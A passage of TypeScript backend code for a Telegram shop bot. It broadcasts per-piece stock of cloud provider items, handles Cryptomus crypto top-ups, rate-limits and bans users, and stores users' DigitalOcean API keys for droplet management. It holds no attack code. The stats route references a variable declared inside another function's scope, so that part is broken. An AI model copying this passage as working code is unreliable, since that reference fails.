      else if (catLower.includes('digital ocean') || catLower.includes('digitalocean')) catIcon = '<tg-emoji emoji-id="6235413342576450502">💧</tg-emoji> ';
      else if (catLower.includes('azure')) catIcon = '<tg-emoji emoji-id="6235420094265037090">☁️</tg-emoji> ';
      else if (catLower.includes('kamatera')) catIcon = '<tg-emoji emoji-id="6235239937566838722">☁️</tg-emoji> ';

      availabilityMsg += `➖➖➖ ${catIcon}<b>${category}</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji> ➖➖➖\n`;
      for (const item of items) {
        let formattedName = item.name.replace(/🇱🇰/g, '<tg-emoji emoji-id="5224277294050192388">🇱🇰</tg-emoji>');
        if (!formattedName.includes('5785025630055700143')) {
          formattedName = formattedName.replace(/\bAWS\b/gi, '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> AWS');
        }
        availabilityMsg += `${formattedName} | $${(item.price / 100).toFixed(2)} | In stock ${item.stockCount} pcs\n`;
      }
      availabilityMsg += "\n";
    }

    // Use the main bot instead of the broadcast bot
    const mainBot = bot;

    if (!mainBot) {
      return res.status(400).json({ message: "Main bot not initialized" });
    }

    // Production: Scale broadcast to all active Telegram users
    const users = await storage.getAllTelegramUsers();
    const targets = users.map(u => u.telegramId);

    let countSent = 0;
    for (const targetId of targets) {
      try {
        await mainBot.sendMessage(targetId, availabilityMsg, { parse_mode: 'HTML' });
        countSent++;
      } catch (err) {
        console.error(`Failed to send availability to user ${targetId}:`, err);
      }
    }

    res.json({ success: true, count: countSent });
  } catch (err) {
    console.error('Broadcast availability error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/settings", isAuth, async (req, res) => {
  try {
    const { key, value } = req.body;
    const updated = await storage.updateSetting(key, value);

    // Re-initialize bot if token changed
    if (key === "TELEGRAM_BOT_TOKEN" || key === "BROADCAST_BOT_TOKEN") {
      await initBot();
    } else if (key === "VAPID_PUBLIC_KEY" || key === "VAPID_PRIVATE_KEY" || key === "VAPID_SUBJECT") {
      const { initPushNotifications } = await import("./push-notifications");
      await initPushNotifications();
    }

    res.json(updated);
  } catch (err) {
    console.error('Settings update error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.get("/api/settings/:key", isAuth, async (req, res) => {
  try {
    const setting = await storage.getSetting(req.params.key);
    res.json(setting || { key: req.params.key, value: "" });
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

// Backup Routes
app.get("/api/backups/config", isAuth, async (req, res) => {
  const configs = await storage.getBackupConfigs();
  res.json(configs[0] || null);
});

app.post("/api/backups/config", isAuth, async (req, res) => {
  try {
    const configs = await storage.getBackupConfigs();
    let result;
    if (configs.length > 0) {
      result = await storage.updateBackupConfig(configs[0].id, req.body);
    } else {
      result = await storage.createBackupConfig(req.body);
    }
    res.json(result);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.get("/api/backups/logs", isAuth, async (req, res) => {
  const logs = await storage.getBackupLogs(50);
  res.json(logs);
});

app.post("/api/backups/trigger", isAuth, async (req, res) => {
  const configs = await storage.getBackupConfigs();
  if (configs.length === 0) return res.status(400).json({ message: "No backup configuration found" });

  // Trigger in background
  BackupService.performBackup(configs[0].id).catch(err => console.error("Manual backup trigger failed:", err));
  res.json({ message: "Backup triggered successfully" });
});

// Anti-Spam Protection API Endpoints
app.get("/api/spam-protector/stats", isAuth, async (req, res) => {
  try {
    const autoBanEnabled = (await storage.getSetting('SPAM_AUTO_BAN_ENABLED'))?.value !== 'false';
    const maxReqPerMin = parseInt((await storage.getSetting('SPAM_MAX_REQ_PER_MIN'))?.value || '15', 10);
    const tempBanDurationMins = parseInt((await storage.getSetting('SPAM_TEMP_BAN_DURATION_MINS'))?.value || '15', 10);

    const allUsers = await storage.getAllTelegramUsers();
    const now = Date.now();

    const userStats = allUsers.map(u => {
      const timestamps = (userRequestTimestamps.get(u.telegramId) || []).filter(t => now - t < 60000);
      const isTempBanned = Boolean(u.bannedUntil && new Date(u.bannedUntil).getTime() > now);
      return {
        id: u.id,
        telegramId: u.telegramId,
        username: u.username,
        firstName: u.firstName,
        lastName: u.lastName,
        balance: u.balance,
        isBanned: u.isBanned,
        bannedUntil: u.bannedUntil,
        isTempBanned,
        spamViolations: u.spamViolations || 0,
        lastRequestAt: u.lastRequestAt,
        reqPerMin: timestamps.length
      };
    });

    userStats.sort((a, b) => b.reqPerMin - a.reqPerMin || b.spamViolations - a.spamViolations);
    const totalBannedUsers = userStats.filter(u => u.isBanned || u.isTempBanned).length;

    res.json({
      autoBanEnabled,
      maxReqPerMin,
      tempBanDurationMins,
      totalMonitoredUsers: allUsers.length,
      totalBannedUsers,
      users: userStats
    });
  } catch (err) {
    console.error("Anti-Spam stats error:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/spam-protector/config", isAuth, async (req, res) => {
  try {
    const { autoBanEnabled, maxReqPerMin, tempBanDurationMins } = req.body;
    const maxReq = parseInt(String(maxReqPerMin), 10);
    const tempMins = parseInt(String(tempBanDurationMins), 10);

    if (typeof autoBanEnabled === 'boolean') {
      await storage.updateSetting('SPAM_AUTO_BAN_ENABLED', String(autoBanEnabled));
    }
    if (!isNaN(maxReq) && maxReq > 0) {
      await storage.updateSetting('SPAM_MAX_REQ_PER_MIN', String(maxReq));
    }
    if (!isNaN(tempMins) && tempMins > 0) {
      await storage.updateSetting('SPAM_TEMP_BAN_DURATION_MINS', String(tempMins));
    }

    io.emit('spam_stats_update');

    const confirmedAutoBan = (await storage.getSetting('SPAM_AUTO_BAN_ENABLED'))?.value !== 'false';
    const confirmedMaxReq = parseInt((await storage.getSetting('SPAM_MAX_REQ_PER_MIN'))?.value || '15', 10);
    const confirmedTempMins = parseInt((await storage.getSetting('SPAM_TEMP_BAN_DURATION_MINS'))?.value || '15', 10);

    res.json({
      success: true,
      autoBanEnabled: confirmedAutoBan,
      maxReqPerMin: confirmedMaxReq,
      tempBanDurationMins: confirmedTempMins
    });
  } catch (err) {
    console.error("Anti-Spam config error:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/spam-protector/ban", isAuth, async (req, res) => {
  try {
    const { userId, action } = req.body;
    const id = parseInt(userId, 10);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid user ID" });

    const now = Date.now();
    if (action === 'temp_15m') {
      await storage.updateTelegramUser(id, { isBanned: false, bannedUntil: new Date(now + 15 * 60 * 1000) });
    } else if (action === 'temp_1h') {
      await storage.updateTelegramUser(id, { isBanned: false, bannedUntil: new Date(now + 60 * 60 * 1000) });
    } else if (action === 'temp_24h') {
      await storage.updateTelegramUser(id, { isBanned: false, bannedUntil: new Date(now + 24 * 60 * 60 * 1000) });
    } else if (action === 'perm_ban') {
      await storage.updateTelegramUser(id, { isBanned: true, bannedUntil: null });
    } else if (action === 'unban') {
      await storage.updateTelegramUser(id, { isBanned: false, bannedUntil: null });
    }

    io.emit('spam_stats_update');
    res.json({ success: true });
  } catch (err) {
    console.error("Anti-Spam ban action error:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});

const patchBotMethods = (targetBot: TelegramBot) => {
  if ((targetBot as any).__patched) return;
  (targetBot as any).__patched = true;

  const originalSendMessage = targetBot.sendMessage.bind(targetBot);
  const originalEditMessageText = targetBot.editMessageText.bind(targetBot);
  const originalSendPhoto = targetBot.sendPhoto.bind(targetBot);
  const originalSendVideo = targetBot.sendVideo.bind(targetBot);
  const originalSendDocument = targetBot.sendDocument.bind(targetBot);

  const stripEmojis = (text: string): string => {
    if (!text) return text;
    return text.replace(/<tg-emoji[^>]*>(.*?)<\/tg-emoji>/gi, '$1');
  };

  const isDocumentInvalid = (err: any): boolean => {
    if (!err) return false;
    const msg = err.message || "";
    const desc = err.description || err.response?.body?.description || "";
    const str = String(err);
    return msg.includes('DOCUMENT_INVALID') || 
           desc.includes('DOCUMENT_INVALID') || 
           str.includes('DOCUMENT_INVALID');
  };

  targetBot.sendMessage = async function(chatId: any, text: string, options?: any) {
    try {
      return await originalSendMessage(chatId, text, options);
    } catch (err: any) {
      if (isDocumentInvalid(err) && typeof text === 'string' && text.includes('<tg-emoji')) {
        console.warn(`[Bot API] DOCUMENT_INVALID detected. Stripping tg-emoji tags and retrying sendMessage to ${chatId}`);
        const cleanText = stripEmojis(text);
        return await originalSendMessage(chatId, cleanText, options);
      }
      throw err;
    }
  } as any;

  targetBot.editMessageText = async function(text: string, options?: any) {
    try {
      return await originalEditMessageText(text, options);
    } catch (err: any) {
      if (isDocumentInvalid(err) && typeof text === 'string' && text.includes('<tg-emoji')) {
        console.warn(`[Bot API] DOCUMENT_INVALID detected. Stripping tg-emoji tags and retrying editMessageText`);
        const cleanText = stripEmojis(text);
        return await originalEditMessageText(cleanText, options);
      }
      throw err;
    }
  } as any;

  targetBot.sendPhoto = async function(chatId: any, photo: any, options?: any) {
    try {
      return await originalSendPhoto(chatId, photo, options);
    } catch (err: any) {
      const caption = options?.caption;
      if (isDocumentInvalid(err) && typeof caption === 'string' && caption.includes('<tg-emoji')) {
        console.warn(`[Bot API] DOCUMENT_INVALID detected. Stripping tg-emoji tags and retrying sendPhoto to ${chatId}`);
        const cleanOptions = { ...options, caption: stripEmojis(caption) };
        return await originalSendPhoto(chatId, photo, cleanOptions);
      }
      throw err;
    }
  } as any;

  targetBot.sendVideo = async function(chatId: any, video: any, options?: any) {
    try {
      return await originalSendVideo(chatId, video, options);
    } catch (err: any) {
      const caption = options?.caption;
      if (isDocumentInvalid(err) && typeof caption === 'string' && caption.includes('<tg-emoji')) {
        console.warn(`[Bot API] DOCUMENT_INVALID detected. Stripping tg-emoji tags and retrying sendVideo to ${chatId}`);
        const cleanOptions = { ...options, caption: stripEmojis(caption) };
        return await originalSendVideo(chatId, video, cleanOptions);
      }
      throw err;
    }
  } as any;

  targetBot.sendDocument = async function(chatId: any, doc: any, options?: any) {
    try {
      return await originalSendDocument(chatId, doc, options);
    } catch (err: any) {
      const caption = options?.caption;
      if (isDocumentInvalid(err) && typeof caption === 'string' && caption.includes('<tg-emoji')) {
        console.warn(`[Bot API] DOCUMENT_INVALID detected. Stripping tg-emoji tags and retrying sendDocument to ${chatId}`);
        const cleanOptions = { ...options, caption: stripEmojis(caption) };
        return await originalSendDocument(chatId, doc, cleanOptions);
      }
      throw err;
    }
  } as any;
};

let bot: TelegramBot | null = null;
let broadcastBot: TelegramBot | null = null;

const initBot = async () => {
  try {
    const token = await getBotToken();
    const broadcastTokenSetting = await storage.getSetting("BROADCAST_BOT_TOKEN");
    const broadcastToken = broadcastTokenSetting?.value;

    console.log('Initializing Telegram bots...');

    if (token) {
      if (bot) {
        console.log('Stopping existing main bot...');
        await bot.stopPolling();
      }
      bot = new TelegramBot(token, { polling: true });
      patchBotMethods(bot);
      setupBotHandlers(bot);
      setupBotProfile(bot).catch(err => console.error('Failed to setup bot profile:', err));
      console.log('Main bot initialized successfully');
    }

    if (broadcastToken && broadcastToken !== token) {
      if (broadcastBot) {
        console.log('Stopping existing broadcast bot...');
        await broadcastBot.stopPolling();
      }
      broadcastBot = new TelegramBot(broadcastToken, { polling: true });
      patchBotMethods(broadcastBot);
      setupBotHandlers(broadcastBot);
      console.log('Broadcast bot initialized successfully');
    } else if (broadcastBot) {
      await broadcastBot.stopPolling();
      broadcastBot = null;
    }
  } catch (err) {
    console.error('Telegram bot init failed:', err);
  }
};

const setupBotProfile = async (targetBot: TelegramBot) => {
  try {
    const miniAppUrlSetting = await storage.getSetting("MINI_APP_URL");
    const botAboutSetting = await storage.getSetting("BOT_ABOUT_TEXT");
    const botDescSetting = await storage.getSetting("BOT_DESCRIPTION_TEXT");

    const miniAppUrl = miniAppUrlSetting?.value;

    // Removed: Set Menu Button to point to Mini App per user request
    /*
    if (miniAppUrl) {
      await targetBot.setChatMenuButton({
        menu_button: {
          type: 'web_app',
          text: 'Open App',
          web_app: { url: miniAppUrl }
        }
      });
      console.log('Bot Menu Button set to:', miniAppUrl);
    }
    */

    // 2. Set Bot Descriptions
    if (botAboutSetting?.value) {
      await targetBot.setMyShortDescription({ short_description: botAboutSetting.value });
    }
    if (botDescSetting?.value) {
      await targetBot.setMyDescription({ description: botDescSetting.value });
    }

  } catch (err: any) {
    // Ignore errors related to bot profile setup if API key is restricted
    console.error('Bot profile setup warning:', err.message);
  }
};

const setupBotHandlers = (targetBot: TelegramBot) => {
  // Polling error handling
  targetBot.on('polling_error', (error: any) => {
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
      console.warn(`[Bot Polling Warning] 409 Conflict for token hash ${targetBot.token ? targetBot.token.substring(0, 12) : 'none'}. Another bot instance is polling or webhook is set.`);
    } else {
      console.error('Bot polling error:', error);
    }
  });

  targetBot.on('my_chat_member', async (update) => {
    const chat = update.chat;
    if (update.new_chat_member.status === 'member' || update.new_chat_member.status === 'administrator') {
      try {
        const channels = await storage.getBroadcastChannels();
        if (!channels.some(c => c.channelId === chat.id.toString())) {
          await storage.createBroadcastChannel({
            channelId: chat.id.toString(),
            name: chat.title || 'Auto-detected Group'
          });
        }
      } catch (err) {
        console.error('Failed to auto-register group:', err);
      }

      // Sync to forwarding groups if using the same token
      try {
        const mainToken = await getBotToken();
        const forwardTokenSetting = await storage.getSetting("TG_FORWARD_BOT_TOKEN");
        const forwardToken = forwardTokenSetting?.value;
        if (forwardToken === mainToken && targetBot.token === mainToken) {
          await addOrUpdateGroup(chat.id.toString(), chat.title || 'Auto-detected Group');
        }
      } catch (err) {
        console.error('Failed to sync forward group in my_chat_member:', err);
      }
    } else if (update.new_chat_member.status === 'left' || update.new_chat_member.status === 'kicked') {
      try {
        const mainToken = await getBotToken();
        const forwardTokenSetting = await storage.getSetting("TG_FORWARD_BOT_TOKEN");
        const forwardToken = forwardTokenSetting?.value;
        if (forwardToken === mainToken && targetBot.token === mainToken) {
          await removeGroup(chat.id.toString());
        }
      } catch (err) {
        console.error('Failed to remove forward group in my_chat_member:', err);
      }
    }
  });

  // Detect groups when a message is sent to them
  targetBot.on('message', async (msg) => {
    if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
      try {
        const channels = await storage.getBroadcastChannels();
        if (!channels.some(c => c.channelId === msg.chat.id.toString())) {
          await storage.createBroadcastChannel({
            channelId: msg.chat.id.toString(),
            name: msg.chat.title || 'Auto-detected Group'
          });
        }
      } catch (err) {
        console.error('Failed to auto-register group from message:', err);
      }

      // Sync to forwarding groups if using the same token
      try {
        const mainToken = await getBotToken();
        const forwardTokenSetting = await storage.getSetting("TG_FORWARD_BOT_TOKEN");
        const forwardToken = forwardTokenSetting?.value;
        if (forwardToken === mainToken && targetBot.token === mainToken) {
          await addOrUpdateGroup(msg.chat.id.toString(), msg.chat.title || 'Auto-detected Group');
        }
      } catch (err) {
        console.error('Failed to sync forward group in message:', err);
      }
    }
  });

  // Handle interactive features for both bots if they are groups/channels
  // But commands and user profiles are handled by the main bot (bot variable)
  
async function processCryptomusInvoiceCreation(targetBot: TelegramBot, chatId: number, tgUser: any, amount: number) {
  const apiKey = (await storage.getSetting('CRYPTOMUS_API_KEY'))?.value;
  const merchantId = (await storage.getSetting('CRYPTOMUS_MERCHANT_ID'))?.value;

  if (!apiKey || !merchantId) {
    targetBot.sendMessage(chatId, "❌ Cryptomus is not configured by admin.");
    return;
  }

  try {
    const orderId = crypto.randomBytes(12).toString('hex');
    const host = process.env.NODE_ENV === 'production'
      ? 'cloudshopplatform.site'
      : 'localhost:5000';

    const existingPending = await storage.getPendingPaymentByAmount(tgUser.id, Math.round(amount * 100));
    if (existingPending) {
      return targetBot.sendMessage(chatId, `⚠️ You already have a pending $${amount} payment. Please pay that one first or wait for it to expire (1 hour).`);
    }

    const sign = crypto.createHash('md5').update(Buffer.from(JSON.stringify({
      amount: amount.toString(),
      currency: 'USD',
      order_id: orderId,
      url_callback: `https://${host}/api/payments/webhook`
    })).toString('base64') + apiKey).digest('hex');

    const response = await axios.post('https://api.cryptomus.com/v1/payment', {
      amount: amount.toString(),
      currency: 'USD',
      order_id: orderId,
      url_callback: `https://${host}/api/payments/webhook`
    }, {
      headers: {
        'merchant': merchantId,
        'sign': sign
      }
    });

    if (response.data.result) {
      const paymentData = response.data.result;
      const newPayment = await storage.createPayment({
        telegramUserId: tgUser.id,
        amount: Math.round(amount * 100),
        paymentMethod: 'cryptomus',
        status: 'pending',
        cryptomusUuid: paymentData.uuid
      });

      await storage.updateTelegramUser(tgUser.id, { lastAction: null });

      const responseMsg = `<tg-emoji emoji-id="5341506639688126935">💰</tg-emoji> <b>Cryptomus Top-up Invoice</b>\n` +
        `➖➖➖➖➖➖➖➖➖➖\n` +
        `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Top-up amount: <b>$${amount.toFixed(2)} USD</b>\n` +
        `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Status: ⏳ <b>Pending</b>\n` +
        `➖➖➖➖➖➖➖➖➖➖\n` +
        `Click on the button below to pay via <b>Cryptomus</b>:`;

      targetBot.sendMessage(chatId, responseMsg, {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Go to payment', url: paymentData.url, icon_custom_emoji_id: '5373123633415695601' }],
            [{ text: 'Check payment', callback_data: `check_payment_${newPayment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
          ] as any
        }
      });
    } else {
      throw new Error("Invalid response from Cryptomus");
    }
  } catch (err: any) {
    console.error('Cryptomus creation error:', err.response?.data || err.message);
    targetBot.sendMessage(chatId, "❌ Failed to create Cryptomus invoice. Please try again later.");
  }
}

// Anti-Spam Rate Limiter sliding window (user_id -> timestamps of requests in last 60 seconds)
const userRequestTimestamps = new Map<string, number[]>();

async function processAntiSpamCheck(userId: string, chatId: number, queryId?: string): Promise<boolean> {
  try {
    const tgUser = await storage.getTelegramUser(userId);
    if (!tgUser) return false;

    const now = Date.now();

    // 1. Permanent Ban Check
    if (tgUser.isBanned) {
      const bannedMsg = `<tg-emoji emoji-id="6298544405435387645">🚫</tg-emoji> <b>Access Prohibited</b>\n\nYour account has been permanently suspended by the administrator. Please contact support if you believe this is an error.`;
      if (queryId && targetBot) {
        await targetBot.answerCallbackQuery(queryId, { text: "🚫 Access Prohibited. Account suspended.", show_alert: true }).catch(() => {});
      }
      if (targetBot) {
        await targetBot.sendMessage(chatId, bannedMsg, { parse_mode: 'HTML' }).catch(() => {});
      }
      return true;
    }

    // 2. Temporary Ban Check
    if (tgUser.bannedUntil && new Date(tgUser.bannedUntil).getTime() > now) {
      const untilStr = new Date(tgUser.bannedUntil).toLocaleString('en-US');
      const remainingMins = Math.ceil((new Date(tgUser.bannedUntil).getTime() - now) / (60 * 1000));
      const tempBannedMsg = `<tg-emoji emoji-id="6298544405435387645">⚠️</tg-emoji> <b>Access Temporarily Restricted</b>\n\nYour account has been temporarily restricted for high request activity (Spam Protection).\n\n⏱️ <b>Remaining time:</b> ${remainingMins} minute(s)\n📌 <b>Unbans at:</b> ${untilStr}`;
      if (queryId && targetBot) {
        await targetBot.answerCallbackQuery(queryId, { text: `⚠️ Account suspended (${remainingMins}m remaining).`, show_alert: true }).catch(() => {});
      }
      if (targetBot) {
        await targetBot.sendMessage(chatId, tempBannedMsg, { parse_mode: 'HTML' }).catch(() => {});
      }
      return true;
    }

    // 3. Sliding Window Rate Calculation
    let timestamps = userRequestTimestamps.get(userId) || [];
    timestamps = timestamps.filter(t => now - t < 60000);
    timestamps.push(now);
    userRequestTimestamps.set(userId, timestamps);

    // Update lastRequestAt timestamp
    await storage.updateTelegramUser(tgUser.id, { lastRequestAt: new Date(now) }).catch(() => {});
    io.emit('spam_stats_update');

    // Fetch Anti-Spam settings
    const autoBanEnabled = (await storage.getSetting('SPAM_AUTO_BAN_ENABLED'))?.value !== 'false';
    const maxReqPerMin = parseInt((await storage.getSetting('SPAM_MAX_REQ_PER_MIN'))?.value || '15', 10);
    const tempBanMins = parseInt((await storage.getSetting('SPAM_TEMP_BAN_DURATION_MINS'))?.value || '15', 10);

    // Trigger Anti-Spam Auto-Ban if threshold exceeded
    if (autoBanEnabled && timestamps.length > maxReqPerMin) {
      const banUntil = new Date(now + tempBanMins * 60 * 1000);
      const newViolations = (tgUser.spamViolations || 0) + 1;
      await storage.updateTelegramUser(tgUser.id, {
        bannedUntil: banUntil,
        spamViolations: newViolations
      });

      const alertMsg = `<tg-emoji emoji-id="6298544405435387645">🚨</tg-emoji> <b>Anti-Spam Alert: Account Suspended!</b>\n\nYou exceeded maximum allowed requests (${timestamps.length}/${maxReqPerMin} per min).\n\n⏱️ Your account is temporarily suspended for <b>${tempBanMins} minutes</b>.`;
      if (queryId && targetBot) {
        await targetBot.answerCallbackQuery(queryId, { text: `🚨 Anti-Spam: ${tempBanMins}m suspension issued.`, show_alert: true }).catch(() => {});
      }
      if (targetBot) {
        await targetBot.sendMessage(chatId, alertMsg, { parse_mode: 'HTML' }).catch(() => {});
      }

      const userDisplayName = tgUser.firstName || tgUser.username || `User ${userId}`;
      io.emit('admin_notification', {
        type: 'anti_spam',
        title: '🚨 Anti-Spam Auto-Ban Triggered',
        message: `${userDisplayName} auto-suspended for ${tempBanMins} mins (${timestamps.length} req/min)`,
        data: { userId, telegramId: userId, rate: timestamps.length, bannedUntil: banUntil }
      });

      return true;
    }
  } catch (err) {
    console.error("Error in processAntiSpamCheck:", err);
  }

  return false;
}

  const processedCallbacks = new Set<string>();

  targetBot.on('callback_query', async (query) => {
    try {
      const callbackId = query.id;
      const data = query.data;
      const userId = query.from?.id.toString();
      console.log(`[Bot Callback] callback_query event received. data=${data}, userId=${userId}, callbackId=${callbackId}`);

      if (processedCallbacks.has(callbackId)) {
        console.log(`[Bot Callback] Duplicate callbackId ${callbackId} skipped.`);
        return;
      }
      processedCallbacks.add(callbackId);
      setTimeout(() => processedCallbacks.delete(callbackId), 10000);

      const chatId = query.message?.chat.id;
      if (!chatId || !data || !userId) {
        console.log(`[Bot Callback] Missing required info: chatId=${chatId}, data=${data}, userId=${userId}`);
        return;
      }

      // 1. Immediately answer the callback query to clear client spinner (except for check_payment_ where custom modal alert popup is shown)
      if (!data.startsWith('check_payment_')) {
        try {
          console.log(`[Bot Callback] Answering callback query: ${callbackId}`);
          await targetBot.answerCallbackQuery(query.id);
        } catch (err: any) {
          console.error(`[Bot Callback] Failed to answer callback query:`, err.message);
        }
      }

      // Only handle actions on the main bot
      const isMainBot = targetBot.token === bot?.token;
      console.log(`[Bot Callback] Checking if main bot: targetBot.token === bot.token is ${isMainBot}. targetBot token hash=${targetBot.token ? targetBot.token.substring(0, 12) : 'none'}, bot token hash=${bot?.token ? bot.token.substring(0, 12) : 'none'}`);
      if (!isMainBot) return;

      const isBlocked = await processAntiSpamCheck(userId, chatId, query.id);
      if (isBlocked) return;

      const tgUser = await storage.getTelegramUser(userId);
      if (!tgUser) return;

      // Start fast countdown on any button interaction
      try {
        const activeOffers = await storage.getActiveSpecialOffers();
        if (tgUser?.lastOfferBroadcastId && activeOffers.length > 0) {
          startFastTimer(userId, activeOffers[0].id, tgUser.lastOfferBroadcastId);
        }
      } catch (err) {
        console.error("Error in fast timer trigger:", err);
      }

      // --- LOGIC FROM LISTENER 1 & 2 ---
      if (data === 'tutorial_menu') {
        const opts: TelegramBot.EditMessageTextOptions = {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: {
            inline_keyboard: [
              [{ text: '⛱️ How to Buy Items', callback_data: 'tutorial_how_to_buy' }],
              [{ text: '🏖️ How to Deposit', callback_data: 'tutorial_how_to_deposit' }],
              [{ text: '🔙 Back to Profile', callback_data: 'profile_refresh' }]
            ]
          },
          parse_mode: 'Markdown'
        };
        try {
          await targetBot.editMessageText('📖 *Tutorial Menu*\n\nChoose a tutorial to watch:', opts);
        } catch (err) {
          console.error('Failed to edit message for tutorial menu:', err);
        }
        return;
      }

      if (data === 'tutorial_how_to_buy' || data === 'tutorial_how_to_deposit') {
        const settingKey = data === 'tutorial_how_to_buy' ? 'TUTORIAL_BUY_VIDEO' : 'TUTORIAL_DEPOSIT_VIDEO';
        const videoSetting = await storage.getSetting(settingKey);
        const videoValue = videoSetting?.value || (data === 'tutorial_how_to_buy' ? 'how_to_buy_itmes.mp4' : 'how_to_deposit.mp4');

        if (!videoValue) {
          await targetBot.sendMessage(chatId, '⚠️ Tutorial video not available yet.');
          return;
        }

        const title = data === 'tutorial_how_to_buy' ? 'How to Buy Items' : 'How to Deposit';

        // Send wait message
        const waitMsg = await targetBot.sendMessage(chatId, "⏳ *Preparing Tutorial...* please wait a moment.", { parse_mode: 'Markdown' });

        // Check if it's a file path or a URL
        if (videoValue.startsWith('http')) {
          await targetBot.sendMessage(chatId, `🏖️ *${title}*\n\nYou can watch the tutorial video here: ${videoValue}`, { parse_mode: 'Markdown' });
          if (waitMsg) await targetBot.deleteMessage(chatId, waitMsg.message_id).catch(() => { });
        } else {
          let fileName = videoValue;
          if (!fileName.toLowerCase().endsWith('.mp4')) {
            fileName += '.mp4';
          }

          // Ensure static route is available (re-added for reliability)
          app.use('/tutorials', express.static(path.join(process.cwd(), 'public', 'tutorials')));
          app.use('/tutorials_dist', express.static(path.join(process.cwd(), 'dist', 'public', 'tutorials')));

          const findVideoFile = (name: string) => {
            const root = process.cwd();
            const potential = [
              path.join(root, 'public', 'tutorials', name),
              path.join(root, 'dist', 'public', 'tutorials', name),
              path.join(root, 'client', 'public', 'tutorials', name),
              path.join(root, 'tutorials', name),
              path.resolve(root, '..', 'public', 'tutorials', name)
            ];
            
            for (const p of potential) {
              if (fs.existsSync(p)) return p;
            }
            return null;
          };

          const filePath = findVideoFile(fileName) || 
                           findVideoFile(videoValue) || 
                           findVideoFile(fileName.replace('itmes', 'items')) ||
                           findVideoFile(fileName.replace('items', 'itmes'));

          // Get the domain for fallback URL
          const miniAppUrlSetting = await storage.getSetting("MINI_APP_URL");
          const domain = miniAppUrlSetting?.value ? new URL(miniAppUrlSetting.value).origin : "";
          const fileUrl = domain ? `${domain}/tutorials/${fileName}` : "";

          console.log(`Attempting to send video: ${filePath} (Fallback URL: ${fileUrl})`);

          if (filePath && fs.existsSync(filePath)) {
            try {
              // Show uploading status in Telegram
              await targetBot.sendChatAction(chatId, 'upload_video');
              
              // Try sending using file path string (lib handles reading)
              await targetBot.sendVideo(chatId, filePath, {
                caption: `🏖️ *${title}*`,
                parse_mode: 'Markdown',
                supports_streaming: true
              });
              console.log('Video sent successfully using path string');
            } catch (sendErr: any) {
              console.error('sendVideo path error, trying document:', sendErr.message);
              try {
                await targetBot.sendChatAction(chatId, 'upload_document');
                // Try sending as document
                await targetBot.sendDocument(chatId, filePath, {
                  caption: `🏖️ *${title}* (Video File)`,
                  parse_mode: 'Markdown'
                }, { filename: fileName });
                console.log('Video sent successfully as document');
              } catch (docErr: any) {
                console.error('sendDocument error, trying URL:', docErr.message);
                if (fileUrl) {
                  try {
                    await targetBot.sendVideo(chatId, fileUrl, {
                      caption: `🏖️ *${title}*`,
                      parse_mode: 'Markdown'
                    });
                  } catch (urlErr: any) {
                    await targetBot.sendMessage(chatId, `❌ *Error*: Unable to play video directly.\n\n[Click here to watch](${fileUrl})`, { parse_mode: 'Markdown' });
                  }
                } else {
                  await targetBot.sendMessage(chatId, `❌ *Error*: Failed to send video. Please contact support.`, { parse_mode: 'Markdown' });
                }
              }
            } finally {
              if (waitMsg) await targetBot.deleteMessage(chatId, waitMsg.message_id).catch(() => { });
            }
          } else {
            await targetBot.sendMessage(chatId, `📺 *${title}*\n\nVideo file missing on server. Please contact support.`, { parse_mode: 'Markdown' });
            if (waitMsg) await targetBot.deleteMessage(chatId, waitMsg.message_id).catch(() => { });
          }
        }
        return;
      }

      if (data === 'do_menu') {
        let text = "🌊 *DigitalOcean Integration*\n\n";
        const keyboard = { inline_keyboard: [] as any[][] };

        if (!tgUser.doApiKey) {
          text += "You haven't set your DigitalOcean API key yet. Please provide it to enable droplet creation.";
          keyboard.inline_keyboard.push([{ text: '🔑 Set API Key', callback_data: 'do_set_key' }]);
        } else {
          text += "Your API key is saved. Select an option below:";
          keyboard.inline_keyboard.push([{ text: '🚀 Create Droplet', callback_data: 'do_region_select' }]);
          if (tgUser.lastDropletId) {
            keyboard.inline_keyboard.push([{ text: '📊 Monitoring & Info', callback_data: 'do_monitor_droplet' }]);
          }
          keyboard.inline_keyboard.push([{ text: '🔄 Update API Key', callback_data: 'do_set_key' }]);
        }
        keyboard.inline_keyboard.push([{ text: '🔙 Back', callback_data: 'automation_menu' }]);

        await targetBot.editMessageText(text, {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data === 'automation_menu') {
        const automationEnabled = (await storage.getSetting('AUTOMATION_ENABLED'))?.value !== 'false';

        if (!automationEnabled) {
          await targetBot.sendMessage(chatId, "⚠️ Automation features are currently disabled by admin.");
          return;
        }

        const keyboard = {
          inline_keyboard: [
            [{ text: '🌊 DigitalOcean', callback_data: 'do_menu' }],
            [{ text: '🔙 Back', callback_data: 'profile_refresh' }]
          ]
        };
        await targetBot.editMessageText('🤖 *Automation & Cloud Providers*\n\nSelect a cloud provider to manage your resources:', {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data === 'do_monitor_droplet') {
        if (!tgUser.doApiKey || !tgUser.lastDropletId) return;

        try {
          // Fetch Droplet Info
          const dropletRes = await axios.get(`https://api.digitalocean.com/v2/droplets/${tgUser.lastDropletId}`, {
            headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
          });
          const droplet = dropletRes.data.droplet;

          // Fetch CPU Usage (last 5 minutes)
